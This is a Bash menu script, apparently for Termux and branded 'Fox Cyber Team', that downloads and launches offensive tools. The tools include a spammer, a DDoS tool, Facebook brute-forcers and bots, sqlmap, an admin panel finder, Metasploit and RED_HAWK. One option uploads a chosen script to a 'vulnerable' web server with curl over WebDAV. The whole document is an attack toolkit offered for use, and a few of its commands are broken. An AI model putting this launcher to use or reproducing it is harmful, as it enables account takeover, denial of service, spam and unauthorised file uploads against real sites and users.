#!/bin/bash
#version 1.0 "
echo "_____________________________________________________________"
echo •  "Tools    : KHESA TAMVAN $white         " |lolcat
echo •  "Creadby  : Fox Cyber Team $white   " |lolcat
echo •  "Contact  : 082297538971 $white " |lolcat
echo  "_____________________________________________________________"
echo " "
sleep 1
echo -o "1. Jones Tools";
echo "{•}================================={•} "  |lolcat
sleep 1
echo -o "2. Fox spam";
echo "{•}================================={•} " |lolcat 
sleep 1
echo -o "3. Fox webdav";
echo "{•}================================={•} " |lolcat
sleep 1
echo -o "4. Tools P47R1K21";
echo "{•}================================={•} " |lolcat
sleep 1
echo -o "5. LITEDDOS";
echo "{•}================================={•} " |lolcat
sleep 1
echo -o "6. Tools BAJINGAN";
echo "{•}================================={•} " |lolcat
sleep 1
echo -o "7. sqlmap";
echo "{•}================================={•} " |lolcat
sleep 1
echo -o "8. admin_panel";
echo "{•}================================={•} " |lolcat
sleep 1
echo -o "9. FB MBF";
echo "{•}================================={•} " |lolcat
sleep 1
echo -o "10. FBRUTE";
echo "{•}================================={•} " |lolcat
sleep 1
echo -o "11. Botfb";
echo "{•}================================={•} " |lolcat
sleep 1
echo -o "12. Metasploit";
echo "{•}================================={•} " |lolcat
sleep 1
echo -o "13. Instabot";
echo "{•}================================={•} " |lolcat
sleep 1
echo -o "14. RedHawk";
echo "{•}================================={•} " |lolcat
sleep 1
echo -o "99. info";
echo "{•}================================={•} " |lolcat
sleep 1
echo -o "100. exit";
echo " "
read -p "Tools@F-Tools:~#" command
if [ $command -eq 1 ];
	then
clear
echo "\033[34;1m"
cd
pkg install git
git clone https://github.com/RoboskijR/JTools
cd JTools
pkg install sh
sh JTools.sh
fi
if [ $command -eq 2 ];
	then
clear
echo "\033[32;1m"
cd
pkg install git
git clone https://github.com/RoboskijR/FSpamm
pkg install sh
cd FSpamm
sh FSpam.sh
fi
if [ $command -eq 3 ];
	then
clear
sleep 2
figlet FWebdav
sleep 1
read -p "Nama Script : " script
echo " "
sleep 1
read -p "Web Vuln : " web
sleep 2
curl -T /storage/emulated/0/$script $web
sleep 2
echo " "
echo "Keterangan : "
echo "Jika blank berarti sukses"
sleep 1
echo "Jika muncul eror gagal"
sleep 
fi
if [ $command -eq 4 ];
	then
clear
echo "\033[32;1m"
cd
apt install git
apt install python2
apt install python
apt install termcolor
apt install gem figlet toilet
gem install lolcat
git clone https://github.com/DCT162/P47R1Kv4.git
ls
cd P47R1Kv4
ls
sh Patrik.sh	
fi
if [ $command -eq 5 ];
	then
pkg install python2
pkg install git
git clone https://github.com/4L13199/LITEDDOS
cd LITEDDOS
python2 LITEDDOS.py
fi
if [ $command -eq 6 ];
	then
pip2 install termcolor
pip2 install lolcat
apt install toilet
apt install git
git clone https://github.com/DarknessCyberTeam/BAJINGANv6
cd BAJINGANv6
sh BAJINGAN.sh
fi
if [ $command -eq 7 ];
	then
apt install python2
apt install git
git clone https://github.com/sqlmapproject/sqlmap
cd sqlmap
Python2 sqlmap.py
fi
if [ $command -eq 8 ];
	then
pkg install git
git clone https://github.com/Techzindia/admin_penal
cd admin_penal
chmod +x admin_panel_finder.py
python2 admin_panel_finder.py
fi
if [ $command -eq 9 ];
	then
pkg install python2
pip2 install mechanize
pip2 install --upgrade pip
apt install git 
git clone https://github.com/hnov7/mbf 
cd mbf 
ls 
cd mbf 
ls 
python2 mbf.py
fi
if [ $command -eq 10 ];
	then
echo "JANGAN LUPA FILENYA TARO DI LUAR FOLDER"
clear
sleep 1
apt install python2
apt install python2-dev
apt install wget
pip2 install mechanize
termux-setup-storage
cd /sdcard
cd /storage/emulated/0
python2 fbbrute.py
masukan id target
/sdcard/password.txt
fi
if [ $command -eq 11 ];
	then
pkg install python2
git clone https://github.com/Senitopeng/BotFbBangDjon.git
cd BotFbBangDjon
python2 bangdjon.py
fi
if [ $command -eq 12 ];
	then
apt update && apt upgrade
pkg install wget
wget https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh
chmod 777
./metasploit.sh
cd metasploit-framework
./msfconsole
fi
if [ $command -eq 13 ];
	then
pkg install python2
pkg install git
git clone https://github.com/instabot-py/instabot.py
cd instabot
pip2 install requests
pip2 install requirements.txt
pkg install nano
nano example.py
python2 instabot.py
fi
if [ $command -eq 14 ];
	then
pkg install php
pkg install curl
pkg install git
git clone https://github.com/Tuhinshubhra/RED_HAWK
ls
cd RED_HAWK
chmod +x rhawk.php
ls
php rhawk.php
fi
if [ $command -eq 99 ];
	then
sleep 1
echo "Thanks To All Member Fox Cyber"
sleep 1
echo "./Fx-Anonyfunk"
sleep 1
echo "./Fx-Roboski"
sleep 1
echo "./Fx-Ms 4D3V"
sleep 1
echo "./Fx-73R54K171"
sleep 1
echo "./Fx-Mr CL4�0"
sleep 1
echo "./Fx-Chuliex"
sleep 1
echo "./Fx-BL4KC4TD34D"
sleep 1
echo "./Fx-K3DU7"
sleep 3
sh FTools.sh
fi
if [ $command -eq 100 ];
	then
echo "Terima Kasih Sudah Menggunakan Tools Kami"
sleep 1
fi